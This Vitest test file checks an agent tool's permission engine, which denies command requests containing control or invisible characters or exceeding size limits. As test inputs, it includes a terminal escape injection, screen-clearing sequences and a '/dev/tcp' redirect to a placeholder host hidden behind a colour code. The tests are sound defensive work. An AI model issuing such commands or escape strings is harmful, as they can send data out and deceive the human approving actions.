import { describe, it, expect } from 'vitest';
import { createEngine } from '../../src/permission/engine.js';
import type { ApprovalMode, Decision, PermissionRequest } from '@minitui/types';

const CANONICAL_PHRASE =
  'request contains control or invisible characters and cannot be shown safely; rename the file or path and try again';

let n = 0;
const request = (over: Partial<PermissionRequest> = {}): PermissionRequest => ({
  id: `c${n++}`,
  descriptor: { danger: false, resourceTemplate: 'ffmpeg', summaryTemplate: 'merge clips' },
  resolvedCommand: 'ffmpeg -i a.mp4 out.mp4',
  resolvedPaths: ['/work/a.mp4'],
  ...over,
});

// Drive one check to its outcome without waiting for a reply: race the decision against the first
// surfaced request. A request that surfaces first was ASKED; it is drained and reported as 'ask'.
async function outcome(
  req: PermissionRequest,
  mode: ApprovalMode,
): Promise<Decision | { kind: 'ask' }> {
  const engine = createEngine({ initialRules: { rules: [] }, mode });
  const pending = engine.check(req);
  const iter = engine.requests[Symbol.asyncIterator]();
  const first = await Promise.race([
    pending.then((d) => ({ asked: false as const, d })),
    iter.next().then(() => ({ asked: true as const })),
  ]);
  if (first.asked) {
    engine.disposeAll('drain');
    await pending.catch(() => {});
    return { kind: 'ask' };
  }
  return first.d;
}

const modes: ApprovalMode[] = ['default', 'yolo'];

async function expectCanonicalDeny(req: PermissionRequest): Promise<void> {
  for (const mode of modes) {
    const d = await outcome(req, mode);
    expect(d).toEqual({ kind: 'deny', reason: CANONICAL_PHRASE });
  }
}

const cp = (...codes: number[]): string => String.fromCodePoint(...codes);

// One code point of each kind the check must refuse, written without literal invisible characters.
const members: Array<[string, string]> = [
  ['an OSC sequence', '\x1b]0;pwned\x07'],
  ['CR', '\r'],
  ['LF', '\n'],
  ['TAB', '\t'],
  ['DEL', '\x7f'],
  ['a C1 control', '\x85'],
  ['a bidi override', cp(0x202e)],
  ['a soft hyphen', cp(0x00ad)],
  ['a line separator', cp(0x2028)],
  ['a byte order mark', cp(0xfeff)],
  ['a tag character', cp(0xe0041)],
  ['a private-use code point', cp(0xe000)],
  ['an unassigned code point', cp(0x0378)],
  ['a lone surrogate', String.fromCharCode(0xd800)],
  ['a Hangul filler', cp(0x3164)],
  ['the braille blank', cp(0x2800)],
];

describe('a request with a control or invisible character is denied before anything else', () => {
  it.each(members)('in the command: %s', async (_name, c) => {
    await expectCanonicalDeny(request({ resolvedCommand: `ffmpeg -i a${c}.mp4 out.mp4` }));
  });

  it.each(members)('in a resolved path: %s', async (_name, c) => {
    await expectCanonicalDeny(request({ resolvedPaths: ['/work/ok.mp4', `/work/a${c}b.mp4`] }));
  });

  it.each(members)('in the headline: %s', async (_name, c) => {
    await expectCanonicalDeny(
      request({
        descriptor: {
          danger: false,
          resourceTemplate: 'ffmpeg',
          summaryTemplate: `merge ${c} clips`,
        },
      }),
    );
  });

  it('a network-device command behind a colour sequence gets the fixed phrase and no escape byte', async () => {
    const req = request({ resolvedCommand: '"\x1b[31mX" f > /dev/tcp/example.invalid/80' });
    for (const mode of modes) {
      const d = await outcome(req, mode);
      expect(d).toEqual({ kind: 'deny', reason: CANONICAL_PHRASE });
      expect(JSON.stringify(d)).not.toContain('\x1b');
    }
  });

  it('a string field the check was not written for is covered as well', async () => {
    const withExtra = { ...request(), note: 'harmless\x1b[2Jtext' };
    await expectCanonicalDeny(withExtra);
  });

  it('the request id is covered', async () => {
    await expectCanonicalDeny(request({ id: 'id\x1b[2J' }));
  });
});

describe('the zero-width joiners are refused', () => {
  const family = cp(0x1f468, 0x200d, 0x1f469, 0x200d, 0x1f467);
  const persian = [0x0645, 0x06cc, 0x200c, 0x062e, 0x0648, 0x0627, 0x0647, 0x0645];
  const word = cp(...persian);

  it('an emoji family sequence in the command', async () => {
    await expectCanonicalDeny(request({ resolvedCommand: `echo ${family}` }));
  });
  it('an emoji joiner in a path', async () => {
    await expectCanonicalDeny(request({ resolvedPaths: [`/work/${family}.mp4`] }));
  });
  it('a Persian word with the non-joiner in the command', async () => {
    await expectCanonicalDeny(request({ resolvedCommand: `echo ${word}` }));
  });
  it('the same word in the headline', async () => {
    await expectCanonicalDeny(
      request({
        descriptor: { danger: false, resourceTemplate: 'ffmpeg', summaryTemplate: `merge ${word}` },
      }),
    );
  });
});

describe('a clean request is unaffected', () => {
  it('asks in default mode', async () => {
    expect((await outcome(request(), 'default')).kind).toBe('ask');
  });
  it('is allowed under YOLO', async () => {
    expect((await outcome(request(), 'yolo')).kind).toBe('allow');
  });
  it('ordinary non-ASCII text is allowed under YOLO', async () => {
    const han = cp(0x6f22, 0x5b57);
    expect((await outcome(request({ resolvedPaths: [`/work/${han}.mp4`] }), 'yolo')).kind).toBe(
      'allow',
    );
  });
});

const TOO_LARGE_PHRASE = 'request too large to show for approval';
const commandOfLength = (length: number): string => {
  const head = 'ffmpeg -i ';
  return head + 'a'.repeat(length - head.length);
};

describe('a request over the size budget is denied before the parse, in every mode', () => {
  const tooLarge = async (req: PermissionRequest): Promise<void> => {
    for (const mode of modes) {
      expect(await outcome(req, mode)).toEqual({ kind: 'deny', reason: TOO_LARGE_PHRASE });
    }
  };
  const notTooLarge = async (req: PermissionRequest): Promise<void> => {
    for (const mode of modes) {
      const d = await outcome(req, mode);
      expect(d.kind === 'deny' ? d.reason : '').not.toBe(TOO_LARGE_PHRASE);
    }
  };

  it('a command of 4,096 characters passes and one of 4,097 is denied', async () => {
    await notTooLarge(request({ resolvedCommand: commandOfLength(4096) }));
    await tooLarge(request({ resolvedCommand: commandOfLength(4097) }));
  });

  it('32 paths pass and 33 are denied', async () => {
    const paths = (count: number): string[] =>
      Array.from({ length: count }, (_, i) => `/work/${i}.mp4`);
    await notTooLarge(request({ resolvedPaths: paths(32) }));
    await tooLarge(request({ resolvedPaths: paths(33) }));
  });

  it('a path of 1,024 characters passes and one of 1,025 is denied', async () => {
    await notTooLarge(request({ resolvedPaths: ['/' + 'p'.repeat(1023)] }));
    await tooLarge(request({ resolvedPaths: ['/' + 'p'.repeat(1024)] }));
  });

  it('is judged before the parse: an oversize parse error gets the size phrase', async () => {
    await tooLarge(request({ resolvedCommand: '(' + 'a'.repeat(4100) }));
  });

  it('is judged after the canonical check: an oversize request with a control character gets that phrase', async () => {
    await expectCanonicalDeny(request({ resolvedCommand: 'ffmpeg -i \x1b' + 'a'.repeat(5000) }));
  });
});
